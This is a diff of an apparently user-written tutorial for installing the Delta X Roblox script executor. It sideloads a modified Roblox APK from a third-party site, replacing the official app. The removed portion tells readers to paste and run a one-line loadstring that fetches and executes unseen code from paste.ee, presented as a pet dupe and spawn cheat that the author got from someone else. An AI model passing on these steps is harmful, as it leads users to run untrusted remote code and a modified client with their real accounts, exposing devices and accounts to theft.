@@ -1,15 +1,11 @@
-You want to get the script that can dupe you some pets OR will give you any pet you want? Dont worry, because i will help you with the download AND with using the script. Hope this tutorial helps you.
-(you will already need to have some pets (any) in your inventory for it to work)
-
-
-Firstly, download Delta X (Delta Executer). You can install it on this site: https://delta-executor.com/
-(you also can use any other executers, but i used it with Delta).
+This is a tutorial for Delta X install for everyone who wanted it and still doesn't know how to download it.
+Firstly, Download Delta X (Delta Executer) setup. You can install it on this site: https://delta-executor.com/
 Put the link in the search tab on any browser, it works anywhere (or just click on it)
 Choose your device. It can be Android, IOS, Windows.
 Use the tutorial to download it (for your device).
 
-(in this part, i will show a tutroial for a Android device, because i tried it at android, and it worked).
-After you downloaded the APK file, you need to delete your original roblox, if you dont delete the original roblox, it will not load properly and it will not work.
+(in this part, i will show a tutroial for a Android device, because i tried it at android, and it worked for me).
+After you downloaded the APK file, you need to delete your original roblox, if you dont delete the original roblox, it will not work.
 Open the APK file, and the installation of modified roblox will be completed.
 Open modified roblox, and use your account to login back. (dont worry, no need to use an alt, because it will not do anything bad to the account).
 Join any server in any game. The menu of the executor will appear on the screen automatically.
@@ -20,29 +16,5 @@ After that, it will give you another link, Use it in any browser.
 Press "continue" and copy the key that it will give.
 Go back to the modified roblox, and again, join any random server, and put the key in the "enter key", then, press continue. It will load the menu.
 All set! Now you can use the menu of our executer.
-And now to the last part:
-You must have all the requirements met, otherwise the script will not work.
--Firstly, be on the PUBLIC server. it will NOT work on the private server.
--Secondly, you need to pick up ALL the pets you have on the plot and put them in your hotbar (for the dupe to work), if not, it can think that you're a bot and it will NOT work.
 
-Copy this script:
-loadstring(game:HttpGet("https://paste.ee/r/2pD038RI"))()
-
-And when you have all the requirements met AND you copied the script to the clipboard, press 2nd button (with the joystick icon).
-You can either press on the "thank you for using delta" to put the script and press execute, OR you can press "execute clipboard".
-After you executed it, the script will start to load (it can also teleport you to other server of grow a garden, just dont touch anything).
-Even if you didnt teleported, dont touch anything. The script loades from 1 to 10 minutes, depends on what device you're using (and how good is the internet connection)
-After the waiting, it will load you the menu to use the dupe or spawn any pet in your inventory. (I got the script from another guy, but it works just fine, tried on myself)
-how it works:
-dupe: you pick up the pet that you want to dupe, in the menu press "dupe pet", as lot times as you want. It will give you your duped pets (every duped pet will be 1 year old).
-spawn: you press the "name of the pet", type any pet you want (it needs to be a right one, even one mistake in a letter and it will not work), and then press "spawn". All the pets that you will spawn will be 1 year old.
-
-Enjoy using your script!
-(and im sorry that i changed the text several times, i had alot of mistakes in words because im not so english, im Russian. Tried my best to make that tutorial understandable to read)
-
-
-
-
-
-
-
+Enjoy your Delta X.
